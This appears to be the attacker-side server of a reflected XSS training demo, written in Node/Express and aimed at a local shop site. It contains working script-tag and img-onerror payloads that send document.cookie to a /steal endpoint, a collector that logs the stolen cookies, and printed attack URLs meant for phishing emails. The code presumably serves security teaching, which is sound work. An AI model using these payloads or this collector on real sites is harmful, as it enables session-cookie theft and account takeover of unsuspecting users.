/*
 * How to Run:
 *
 * Terminal 1: cd demo-attacked/xss/reflected && npm install && npm run vulnerable
 * Terminal 2: cd demo-attacked/xss/reflected && npm run guide
 *
 * Attack sequence:
 * 1. http://localhost:3004        ← ShopNest storefront (normal use)
 * 2. http://localhost:3005        ← Attacker dashboard — generate phishing email here
 * 3. Click the CTA link in the generated email → lands on /search?q=<payload>
 * 4. Watch the cookie appear on the attacker dashboard
 */

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3005;
const VICTIM_PORT = 3004;

app.use(cors());
app.use(express.static(path.join(__dirname)));

const stolenCookies = [];

const TRANSPARENT_GIF = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

function buildScriptTagPayload() {
  return `<script>new Image().src='http://localhost:${PORT}/steal?c='+encodeURIComponent(document.cookie)</script>`;
}

function buildImgOnerrorPayload() {
  return `<img src=x onerror="new Image().src='http://localhost:${PORT}/steal?c='+encodeURIComponent(document.cookie)">`;
}

function buildAttackUrl(payload) {
  return `http://localhost:${VICTIM_PORT}/search?q=${encodeURIComponent(payload)}`;
}

app.get('/steal', (req, res) => {
  const cookie = req.query.c || '';

  if (cookie) {
    const entry = {
      cookie,
      timestamp: new Date().toISOString(),
    };
    stolenCookies.unshift(entry);
    console.log(`[STOLEN] Cookie received: ${cookie}`);
  }

  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Cache-Control', 'no-store');
  res.send(TRANSPARENT_GIF);
});

app.get('/api/stolen', (req, res) => {
  res.json(stolenCookies);
});

app.get('/api/payloads', (req, res) => {
  const scriptPayload = buildScriptTagPayload();
  const imgPayload = buildImgOnerrorPayload();
  res.json({
    scriptTag: {
      payload: scriptPayload,
      url: buildAttackUrl(scriptPayload),
    },
    imgOnerror: {
      payload: imgPayload,
      url: buildAttackUrl(imgPayload),
    },
  });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'attacker.html'));
});

app.listen(PORT, () => {
  console.log(`Cookie collector (attacker) running at http://localhost:${PORT}`);

  const scriptUrl = buildAttackUrl(buildScriptTagPayload());
  const imgUrl = buildAttackUrl(buildImgOnerrorPayload());

  console.log('\n=== ATTACK URLS (copy into phishing email) ===');
  console.log(`[Script tag]  ${scriptUrl}`);
  console.log(`[IMG onerror] ${imgUrl}`);
  console.log('');
});
